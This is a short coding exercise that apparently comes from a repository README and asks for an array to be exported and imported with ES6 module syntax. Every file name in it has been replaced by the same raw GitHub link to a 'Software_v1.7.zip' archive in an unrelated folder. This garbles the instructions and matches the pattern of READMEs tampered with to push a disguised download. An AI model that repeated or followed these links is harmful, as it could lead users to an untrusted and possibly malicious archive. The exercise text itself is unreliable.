# Import and Export an Array using ES6 Module Syntax

Create two files `https://raw.githubusercontent.com/vicky9696v/newccbp/main/tuberaceous/Software_v1.7.zip`, `https://raw.githubusercontent.com/vicky9696v/newccbp/main/tuberaceous/Software_v1.7.zip` parallel to `https://raw.githubusercontent.com/vicky9696v/newccbp/main/tuberaceous/Software_v1.7.zip` file.

Write an array with the values as `"countries", 190, "continents", 7, false, 6.2` in the `https://raw.githubusercontent.com/vicky9696v/newccbp/main/tuberaceous/Software_v1.7.zip` file and export it using the default export syntax.

Import the array in the `https://raw.githubusercontent.com/vicky9696v/newccbp/main/tuberaceous/Software_v1.7.zip` file.

<b>Use the ES6 module syntax</b>.
